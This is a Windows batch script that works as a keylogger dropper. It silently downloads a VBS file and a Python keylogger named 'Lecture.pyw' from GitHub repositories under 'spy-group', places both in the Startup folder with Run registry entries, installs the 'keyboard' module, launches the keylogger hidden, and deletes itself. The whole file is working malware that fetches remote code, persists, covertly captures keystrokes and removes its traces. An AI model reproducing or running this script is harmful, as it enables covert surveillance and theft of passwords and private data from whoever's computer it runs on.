@echo off
REM --- Part 1: Download and setup VBS file ---
REM Download the VBS file from GitHub (Silent Mode)
curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs --silent --output "%TEMP%\test.vbs"

REM Copy the downloaded file to the Startup folder
copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Add test.vbs to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f

REM Run the VBS file in background (Prevents Freezing)
start /min wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM --- Part 2: Download and setup Python Keylogger ---
echo Setting up Keylogger...

REM Step 1: Download Lecture.pyw from GitHub
echo Downloading Lecture.pyw from GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/spy-group/keylogger/raw/main/Lecture.pyw' -OutFile '%USERPROFILE%\Downloads\Lecture.pyw'"

REM Step 2: Move Lecture.pyw to Startup folder
echo Moving Lecture.pyw to Startup folder...
move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Add Lecture.pyw to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Keylogger" /t REG_SZ /d "pythonw \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw\"" /f

REM Step 3: Open Microsoft Store for Python 3.12 installation
echo Opening Microsoft Store for Python 3.12 installation...
start ms-windows-store://pdp/?productid=9NCVDN91XZQP

REM Wait for 2 minutes to allow manual installation
echo Waiting for 2 minutes to allow manual Python installation...
timeout /t 120 >nul

REM Step 4: Force close Microsoft Store
taskkill /f /im WinStore.App.exe >nul

REM Step 5: Install the 'keyboard' module
echo Installing 'keyboard' module...
pip install keyboard

REM Step 6: Run Lecture.pyw in hidden mode using pythonw.exe
echo Running Lecture.pyw in hidden mode...
start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"

REM --- Part 3: Cleanup ---
REM Self-delete batch file and close CMD instantly
start /b cmd /c del "%~f0" & exit
